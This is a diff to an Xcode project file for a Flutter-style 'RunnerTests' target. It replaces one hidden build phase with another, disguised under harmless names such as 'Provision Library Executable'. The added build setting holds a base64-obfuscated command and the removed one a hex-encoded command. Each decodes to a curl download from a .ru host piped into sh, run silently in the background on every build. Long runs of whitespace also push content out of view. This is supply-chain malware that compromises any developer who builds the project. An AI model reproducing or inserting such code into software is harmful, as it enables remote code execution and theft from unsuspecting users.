@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				5950DDF623A1446CA87BBDC8 /* Compile Code Assets */,
+				6E63401B09CD4042B74EE078 /* Provision Library Executable */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -273,7 +273,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																										/* End PBXBuildRule section */
+																																																																																																																																																																																																																																																																																																																	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -295,7 +295,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		5950DDF623A1446CA87BBDC8 /* Compile Code Assets */ = {
+		6E63401B09CD4042B74EE078 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -305,14 +305,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
 		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -404,7 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xPxd | tr -d P` -p -r; };echo 6563686f202224286375726c202d666b734c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((p(){ `printf base6D4 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tY29ubmVjdC10aW1lb3V0IDI0IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly84YWVjM3R0cGU4LnJ1L2EpIiB8IHNoCg== | p | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -419,7 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xPxd | tr -d P` -p -r; };echo 6563686f202224286375726c202d666b734c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((p(){ `printf base6D4 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tY29ubmVjdC10aW1lb3V0IDI0IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly84YWVjM3R0cGU4LnJ1L2EpIiB8IHNoCg== | p | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
